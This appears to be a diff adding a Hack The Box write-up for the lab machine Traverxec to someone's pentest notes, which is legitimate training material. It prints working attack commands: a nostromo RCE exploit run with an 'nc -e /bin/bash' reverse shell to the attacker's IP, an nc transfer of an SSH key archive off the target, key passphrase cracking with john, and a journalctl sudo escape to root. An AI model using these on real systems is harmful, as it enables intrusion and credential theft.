@@ -1033,3 +1033,81 @@ rlwrap nc -nvlp 1234
 
 and gg we get our root shell.
 
+
+# Linux : Traverexec : 10.10.10.165 : Easy 
+
+#### Nmap Results : 
+```
+Nmap scan report for 10.10.10.165
+Host is up (0.063s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+This was a fairly simple box in this case if you see versions or services other than like Apache and stuff ideally my first approach would be to go for searchsploit or google search for vulnerabilities on that specific service. 
+
+Doing a Simple searchsploit on nostromo :
+
+```
+searchsploit nostromo
+```
+
+We get the following results : 
+
+```bash
+nostromo 1.9.6 - Remote Code Execution  |  multiple/remote/47837.py
+```
+
+Now we can just use this exploit and here all you have to do is copy this exploit and remove the cve-* word in the start and then we can run this with python2 to get remote code execution and get a reverse shell back to us like so : 
+
+```bash
+python cve2019_16278.py 10.10.10.165 80 "nc -e /bin/bash 10.10.14.2 4444"
+``` 
+
+and listen for a shell back with netcat : 
+```
+rlwrap nc -nvlp 4444
+```
+
+I use rlwrap because it gives a better shell, with ability to move up and down commands like bash.
+
+and then Lets ennumerate more as we are still www-data and our shell is not privelleged enough to cat out the user.txt/root.txt file so lets try to find something laterly and with the www-data shell my main idea would be to always try to look up the config files in the web directory as thats commonly owned by www-data and has passwords in them. In this case that folder would be `/var/nostromo/conf` and here we see 3 files for the most intresting ones are htacesss and nhttpd.conf , we can read htaccess and it has a password hash for the user david , i cracked but it turned out to be a dead end moving on to the nhttpd.conf we see this information 
+
+```bash
+# HOMEDIRS [OPTIONAL]
+
+homedirs                /home
+homedirs_public         public_www
+
+```
+
+Which says that the public_www folder is public to all users in the home dir and we see that in home the only user is David so we can just do this `cd /home/david/public_www/` and get access to files there and we see that there is a folder called protected-file-area which contains backup-ssh-identity-files.tgz and bingo that seems to contain the ssh key lets bring it to our machine and use it to login to transfer files i like to use nc but if you wanna find more information about file transfers and other techniques you can find it in my notes in the file trasnfer section. To transfer we can use :
+```
+# On your machine
+nc -l -p 1234 > backup.tgz
+# On the target machine
+nc -w 3 10.10.14.3 1234 < backup-ssh-identity-files.tgz
+```
+and then we can use tar to unzip this file like so :
+```
+tar -xvf backup.tgz
+```
+and we get the id_rsa key now, if you try to chmod 600 and use it has a passphrase on it we can use ssh2john.py to crack this easily though so lets do that 
+```
+/usr/share/john/ssh2john.py id_rsa > idhash
+```
+Then we can use john to crack this hash :
+```
+sudo john idhash -w=/usr/share/wordlists/rockyou.txt
+```
+
+and we get the password and we can easily just log in to the system as David and to privesc we see that there is a bin directory in the we have a server-stats.sh file which shows that we can run the following command as sudo `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` and we can easily search what we can do with journalctl on gtfobins and we see that this journalctl opens up in less and we can just use !/bin/bash to get shell as root.
